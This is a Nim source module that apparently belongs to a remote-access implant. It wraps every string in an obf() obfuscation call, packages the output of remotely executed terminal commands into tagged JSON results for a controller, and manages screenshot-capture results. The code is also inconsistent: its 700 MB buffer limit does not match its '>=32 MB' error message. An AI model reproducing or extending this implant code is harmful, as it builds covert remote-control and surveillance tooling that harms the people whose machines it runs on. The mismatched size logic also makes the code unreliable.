import std/[json, strutils]
import ../global
import ./tasks as tasks

const tasks_buffer_max* = 700'u64 * 1024 * 1024

proc create_json*(work: tasks.TaskRecord; raw: string; failed: bool): string =
  if work.cmdType == obf("terminal"):
    var termOut =
      if failed:
        if raw.len > 0: raw else: obf("Command failed")
      else:
        raw
    let shell = $(%*{
      obf("option"): obf("output"),
      obf("type"): obf("terminal"),
      obf("task_tag"): work.tag,
      obf("output"): "",
    })
    let maxOut = int(tasks_buffer_max) - shell.len
    if maxOut > 0 and termOut.len > maxOut:
      termOut = obf("Output is too big (>=32 MB)")
    elif maxOut <= 0:
      termOut = obf("Output is too big (>=32 MB)")
    return $(%*{
      obf("option"): obf("output"),
      obf("type"): obf("terminal"),
      obf("task_tag"): work.tag,
      obf("output"): termOut,
    })
  if failed:
    return $(%*{
      obf("option"): obf("output"),
      obf("type"): work.cmdType,
      obf("host"): work.host,
      obf("task_tag"): work.tag,
      obf("error"): if raw.len > 0: raw else: obf("Command failed"),
    })
  raw

proc apply_task_output*(body: string; params: string = obf("{}"); taskTag: string = ""): uint32 =
  var tag = taskTag
  # Só faz parse do JSON para extrair task_tag se o body cabe no limite; acima disso evita parseJson gigante.
  if tag.len == 0 and body.len.uint64 <= tasks_buffer_max:
    try:
      let j = parseJson(body)
      if j.hasKey(obf("task_tag")):
        tag = j[obf("task_tag")].getStr()
    except JsonParsingError:
      discard
  if body.len == 0:
    return 0
  if contains(body, obf("\"type\":\"screenshot\"")):
    var drop: seq[uint32] = @[]
    let order = tasks.taskOrder
    for id in order:
      let (ok, t) = tasks.read_task(id)
      if ok and contains(t.result, obf("\"type\":\"screenshot\"")):
        drop.add id
    for id in drop:
      discard tasks.delete_task(id)
  tasks.create_task(tasks.TaskRecord(
    tag: tag,
    cmdType: obf("output"),
    params: params,
    result: body,
    done: true,
    pendingOut: true,
  ))
